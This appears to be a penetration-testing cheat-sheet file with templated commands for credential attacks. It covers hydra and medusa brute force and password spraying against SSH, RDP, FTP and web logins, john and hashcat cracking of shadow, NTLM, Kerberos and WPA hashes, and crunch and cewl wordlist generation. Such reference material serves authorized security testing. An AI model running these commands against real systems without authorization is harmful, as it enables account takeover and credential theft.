;; Credential attacks: online brute force, offline cracking, wordlist prep.

%tool hydra
%cat command
%tags passwords,bruteforce

@ Brute-force SSH || hydra -l {{user}} -P {{wordlist}} ssh://{{target}}
~ ssh
? online password guessing single service

@ Spray one password across a user list || hydra -L {{userlist}} -p '{{pass}}' ssh://{{target}}
~ spray

@ Brute-force an HTTP POST login form || hydra -l {{user}} -P {{wordlist}} {{target}} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'
~ web
? web form login brute force F= failure string

@ Brute-force RDP (throttled — RDP locks out fast) || hydra -l {{user}} -P {{wordlist}} -t 4 rdp://{{target}}
~ rdp

@ Brute-force FTP || hydra -l {{user}} -P {{wordlist}} ftp://{{target}}
~ ftp

%tool john
%tags passwords,cracking

@ Crack with the default wordlist + best64 rules || john --wordlist={{wordlist:/usr/share/wordlists/rockyou.txt}} --rules=best64 {{hashfile}}
~ wordlist,rules
? john the ripper crack hashes

@ Show cracked passwords || john --show {{hashfile}}
~ show

@ Format a shadow file for cracking || unshadow /etc/passwd /etc/shadow > combined.txt
~ shadow,linux

@ Extract a hash from a zip / rar / pdf / ssh key || zip2john {{file.zip}} > hash.txt
~ extract
Same pattern for `rar2john`, `pdf2john.pl`, `ssh2john.py`, `keepass2john`, `office2john.py` — pick the one matching the file type, then feed the output to `john`.

@ Crack Kerberoast / AS-REP hashes || john --wordlist={{wordlist}} --format=krb5tgs {{hashfile}}
~ kerberos
Use `--format=krb5asrep` for AS-REP hashes instead.

%tool hashcat
%tags passwords,cracking,gpu

@ Dictionary attack (NTLM) || hashcat -m 1000 -a 0 {{hashfile}} {{wordlist:/usr/share/wordlists/rockyou.txt}}
~ ntlm,wordlist
? gpu password cracking hash mode numbers

@ Dictionary + rules || hashcat -m {{mode}} -a 0 {{hashfile}} {{wordlist}} -r /usr/share/hashcat/rules/best64.rule
~ rules

@ Mask attack (known pattern, e.g. Word1!) || hashcat -m {{mode}} -a 3 {{hashfile}} '?u?l?l?l?l?d?s'
~ mask

@ Show already-cracked results || hashcat -m {{mode}} {{hashfile}} --show
~ show

@ Common hash-mode reference || hashcat -m
~ modes,reference
Frequently used: 0 raw MD5 · 100 SHA1 · 1000 NTLM · 1800 sha512crypt ($6$) · 3200 bcrypt · 5600 NetNTLMv2 · 7500/13100 Kerberos AS-REQ / TGS-REP (Kerberoast) · 18200 AS-REP roast · 22000 WPA-PBKDF2-PMKID+EAPOL (modern wifi). `hashcat --example-hashes` prints a sample line for any mode so you can confirm the format matches.

%tool crunch
%tags wordlist,generation

@ Generate a wordlist by length and charset || crunch {{min:8}} {{max:8}} {{charset:0123456789}} -o wordlist.txt
~ generate
? custom wordlist pattern

@ Generate from a pattern (@ = lower, % = digit, ^ = symbol) || crunch 8 8 -t {{pattern:Summer%%@@}} -o wordlist.txt
~ pattern

%tool cewl
%tags wordlist,osint

@ Build a wordlist from a website's own words || cewl {{url}} -d 2 -m 5 -w wordlist.txt
~ scrape
? custom wordlist from target site content company names

%tool medusa
%tags passwords,bruteforce

@ Brute-force a service (hydra alternative) || medusa -h {{target}} -u {{user}} -P {{wordlist}} -M {{service:ssh}}
~ bruteforce

%tool hash-identifier
%cat tool
%tags hashes,identify

@ Identify an unknown hash's likely type || hash-identifier
~ identify
? what hash type is this
Interactive — paste the hash at the prompt. `hashid {{hash}}` (if installed) does the same non-interactively and suggests `-m` hashcat modes directly.
